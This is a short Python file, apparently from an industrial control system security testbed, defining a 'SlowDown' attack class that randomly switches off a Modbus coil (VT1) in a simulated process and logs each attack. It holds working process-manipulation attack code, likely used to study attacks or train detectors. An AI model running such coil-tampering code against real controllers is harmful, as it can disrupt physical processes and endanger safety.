import argparse
import os
import sys
import time
import random
from datetime import datetime
import logging

from pymodbus.client.sync import ModbusTcpClient
from pyics.mtu import MTU
from pyics.utils import *

from overflow import MTUAttack

sys.path.insert(0, "../examples/medium-process")
from constants import *

class SlowDown(MTUAttack):

    def main_loop(self, *args, **kwargs):
        self.varmap[VT1] = self.get_variable(VT1)

        if self.varmap[VT1] is None:
            return

        elif self.varmap[VT1]:
            if random.randint(0, 1) == 1:
                self.export_file.write("[{}] Running attack\n".format(datetime.now()))
                self.change_coil(VT1, False)
